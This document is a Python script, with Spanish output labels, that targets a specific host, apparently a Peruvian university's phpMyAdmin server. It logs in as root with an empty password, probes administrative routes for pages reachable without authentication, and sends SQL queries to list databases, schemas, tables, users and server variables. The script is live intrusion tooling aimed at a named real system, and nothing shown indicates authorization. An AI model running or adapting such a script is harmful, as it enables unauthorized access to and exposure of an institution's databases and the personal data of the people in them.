#!/usr/bin/env python3
import requests, urllib3, re, json
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest'})

# Login with root/
s.post('https://orcl.uns.edu.pe/index.php',
            data={'pma_username': 'root', 'pma_password': '', 'server': '1'},
            timeout=5)

print("=== COOKIES DE SESION ===")
print(f"Cookies: {dict(s.cookies)}")
print()

# Try to access phpMyAdmin routes via AJAX (no JS needed)
routes = [
    'index.php?route=/server/databases',
    'index.php?route=/server',
    'index.php?route=/',
]

for route in routes:
    r = s.get(f'https://orcl.uns.edu.pe/index.php?{route}', timeout=5)
    tc = re.sub(r'<[^>]+>', ' ', r.text)
    tc = re.sub(r'\\s+', ' ', tc).strip()
    print(f"Route: {route}")
    print(f"  Status: {r.status_code}, len: {len(r.text)}")
    
    # Check for JSON response
    if r.text.startswith('{') or 'json' in r.headers.get('Content-Type', ''):
        print(f"  JSON: {r.text[:500]}")
    
    # Check for database content
    if 'mysql' in tc.lower() or 'database' in tc.lower():
        print(f"  [!] Database info found!")
        # Extract database names
        db_matches = re.findall(r'(?:mysql|information_schema|phpmyadmin|uns|registro)[^<,"]*', tc, re.IGNORECASE)
        print(f"  Databases: {db_matches[:10]}")
    
    # Look for any data in the response
    if len(r.text) > 500:
        # Extract tables/data
        td_data = re.findall(r'<td[^>]*>([^<]+)</td>', r.text)
        if td_data:
            print(f"  Table data: {td_data[:10]}")
    
    print()

# Try to execute SQL queries via AJAX
print("=== EJECUTAR CONSULTAS SQL ===")
queries = [
    ('SELECT VERSION()', 'MySQL version'),
    ('SHOW DATABASES', 'List databases'),
    ('SELECT user(), current_user()', 'Current user'),
]

for query, desc in queries:
    r = s.post('https://orcl.uns.edu.pe/index.php',
                     data={'sql': query, 'ajax_request': 'true', 'ajax_page_request': 'true'},
                     timeout=5)
    tc = re.sub(r'<[^>]+>', ' ', r.text)
    tc = re.sub(r'\\s+', ' ', tc).strip()
    print(f"{desc}: {tc[:300]}")
    if r.text.startswith('{'):
        try:
            data = json.loads(r.text)
            print(f"  JSON: {data}")
        except:
            print(f"  Raw JSON: {r.text[:500]}")
    print()

# Try to access server variables
print("=== VARIABLES DEL SERVIDOR ===")
r_vars = s.get('https://orcl.uns.edu.pe/index.php?route=/server/variables', timeout=5)
tc_vars = re.sub(r'<[^>]+>', ' ', r_vars.text)
tc_vars = re.sub(r'\\s+', ' ', tc_vars).strip()
print(f"Status: {r_vars.status_code}")
if 'version' in tc_vars.lower():
    print(f"[!] Server variables accessible!")
    version_lines = re.findall(r'(?:Version|version|MySQL|MariaDB)[^<]*', tc_vars, re.IGNORECASE)
    print(f"  {version_lines[:10]}")

# Try to access databases list
print("\n=== LISTAR BASES DE DATOS ===")
r_dbs = s.get('https://orcl.uns.edu.pe/index.php?route=/server/databases', timeout=5)
tc_dbs = re.sub(r'<[^>]+>', ' ', r_dbs.text)
tc_dbs = re.sub(r'\\s+', ' ', tc_dbs).strip()
print(f"Status: {r_dbs.status_code}, len: {len(r_dbs.text)}")
# Look for database list
db_patterns = ['mysql', 'information_schema', 'phpmyadmin', 'uns', 'registro', 'sistemas']
for dbp in db_patterns:
    if dbp in tc_dbs.lower():
        print(f"  [!] Found database: {dbp}")

# Try to get databases through different routes
print("\n=== RUTAS ALTERNATIVAS ===")
alt_routes = [
    'index.php?route=/server/databases/data',
    'index.php?route=/server/status',
    'index.php?route=/server/user-groups',
    'index.php?route=/server/privileges',
]

for route in alt_routes:
    r_a = s.get(f'https://orcl.uns.edu.pe/{route}', timeout=5)
    tc_a = re.sub(r'<[^>]+>', ' ', r_a.text)
    tc_a = re.sub(r'\\s+', ' ', tc_a).strip()
    print(f"{route.split('=')[1]}: status={r_a.status_code}, len={len(r_a.text)}")
    if len(r_a.text) > 500 and 'login' not in tc_a.lower():
        print(f"  [!] Accessible without login!")
        print(f"  Content: {tc_a[:300]}")

# Try to get the actual database data
print("\n=== DATOS DE BASES DE DATOS ===")
# Try to access MySQL system tables
db_queries = [
    ('SHOW DATABASES', 'Show databases'),
    ('SELECT SCHEMA_NAME FROM information_schema.SCHEMATA', 'Schemas'),
    ('SELECT table_schema, table_name FROM information_schema.TABLES LIMIT 30', 'Tables'),
]

for query, desc in db_queries:
    r_q = s.post('https://orcl.uns.edu.pe/index.php',
                        data={'sql': query, 'ajax_request': 'true', 'ajax_page_request': 'true'},
                        timeout=5)
    tc_q = re.sub(r'<[^>]+>', ' ', r_q.text)
    tc_q = re.sub(r'\\s+', ' ', tc_q).strip()
    print(f"\n{desc}:")
    print(f"  Response: {tc_q[:500]}")
    if r_q.text.startswith('{'):
        try:
            data = json.loads(r_q.text)
            if 'message' in data or 'sql_data' in data:
                print(f"  JSON data: {data}")
        except:
            print(f"  Raw: {r_q.text[:300]}")

print("\n=== RESULTADO FINAL ===")
print("Si se pueden ver las BD, las listas abajo")
print("Si no, la BD requiere JavaScript para mostrarse")
